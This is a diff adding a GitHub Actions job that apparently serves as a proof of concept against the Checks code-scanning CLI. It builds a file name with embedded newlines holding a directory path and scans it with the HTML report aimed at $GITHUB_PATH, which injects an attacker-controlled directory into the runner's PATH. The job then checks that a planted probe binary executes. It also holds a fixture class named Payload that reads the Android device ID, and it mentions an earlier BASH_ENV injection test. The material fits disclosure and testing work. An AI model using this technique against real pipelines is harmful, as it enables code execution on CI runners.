@@ -187,3 +187,82 @@ jobs:
           test -f t1_json_bash_env_marker.txt
           cat t1_json_bash_env_marker.txt
           printf 'T1_JSON_ENV_BASH_ENV_RESULT=executed\n'
+
+  path-line-tolerance:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Prepare Checks PATH fixture
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf scan-root-path t1-owned-bin
+          mkdir -p scan-root-path t1-owned-bin
+          cat > t1-owned-bin/t1-path-probe <<'SH'
+          #!/usr/bin/env bash
+          set -euo pipefail
+          printf 'T1_GITHUB_PATH_PROBE_EXECUTED_20260605\n' > t1_path_probe_marker.txt
+          printf 'T1_GITHUB_PATH_PROBE_EXECUTED_20260605\n'
+          SH
+          chmod +x t1-owned-bin/t1-path-probe
+          python3 - <<'PY'
+          from pathlib import Path
+
+          source = """\
+          import android.provider.Settings;
+
+          class Payload {
+            void leak(android.content.ContentResolver cr) {
+              String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
+              String marker = "T1_GITHUB_PATH_LINE_TOLERANCE_20260605";
+            }
+          }
+          """
+          Path("scan-root-path/Control.java").write_text(source)
+          injected_path = str((Path.cwd() / "t1-owned-bin").resolve())
+          name = "PathLineProbe\n" + injected_path + "\nPayload.java"
+          Path("scan-root-path", name).write_text(source)
+          print(f"injected-path={injected_path}")
+          PY
+
+      - name: Install Checks CLI
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl --compressed https://dl.google.com/checks/cli/latest/checks-linux -o checks
+          chmod +x ./checks
+          ./checks --version
+
+      - name: Write Checks HTML report into actual GITHUB_PATH
+        shell: bash
+        run: |
+          set -euo pipefail
+          injected_path="$(pwd)/t1-owned-bin"
+          printf 'github-path-file=%s\n' "$GITHUB_PATH"
+          printf 'expected-injected-path=%s\n' "$injected_path"
+          ./checks code scan scan-root-path \
+            --skip-upload \
+            --format=html \
+            --output "$GITHUB_PATH" \
+            --account-id=1 \
+            --repo-id=1 \
+            --scm-remote-url=https://github.com/cllc3993/checks-s1-ci-impact-poc \
+            --branch-name=t1-path-line-tolerance \
+            --scm-revision="T1_PATH_LINE_TOLERANCE_${GITHUB_RUN_ID}_${GITHUB_RUN_ATTEMPT}" \
+            --disable-analytics \
+            --disable-version-check \
+            --no-input
+          printf 'github-path-first-line=%s\n' "$(sed -n '1p' "$GITHUB_PATH")"
+          grep -nF "$injected_path" "$GITHUB_PATH"
+
+      - name: Verify hosted runner applied PATH line
+        shell: bash
+        run: |
+          set -euo pipefail
+          command -v t1-path-probe
+          t1-path-probe
+          test -f t1_path_probe_marker.txt
+          cat t1_path_probe_marker.txt
+          printf 'T1_GITHUB_PATH_LINE_TOLERANCE_RESULT=path-applied\n'
